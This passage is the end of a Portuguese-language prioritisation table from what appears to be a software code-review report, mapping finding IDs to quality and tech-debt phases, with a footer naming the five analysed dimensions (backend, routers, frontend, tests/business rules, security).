| **3** — Qualidade | A-01, A-04, A-05, A-06, A-07, A-09, A-17, M-01..M-12 | Robustez e normalização |
| **4** — Tech Debt | M-16..M-20, B-01..B-07 | Testes e dívida acumulada |

---

*Arquivo gerado a partir de análise estrutural de 5 dimensões: Backend Core, Routers, Frontend, Testes/Regras de Negócio e Segurança.*
